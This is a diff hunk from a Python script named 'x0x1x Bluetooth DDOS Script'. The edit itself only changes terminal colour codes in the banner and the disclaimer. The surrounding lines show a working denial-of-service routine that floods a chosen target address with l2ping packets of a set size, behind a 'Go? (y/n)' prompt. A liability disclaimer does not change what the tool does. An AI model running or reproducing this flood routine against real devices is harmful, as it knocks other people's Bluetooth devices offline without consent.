@@ -6,12 +6,12 @@ def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
 def printLogo():
-    print('\x1b[38;5;231m                      x0x1x Bluetooth DDOS Script                            ')
+    print('\x1b[38;5;47m                      x0x1x Bluetooth DDOS Script                            ')
 def main():
     printLogo()
     time.sleep(0.1)
     print('')
-    print('\x1b[38;5;47mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
+    print('THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
     if (input("Go? (y/n) > ") in ['y', 'Y']):
         time.sleep(0.1)
         os.system('clear')
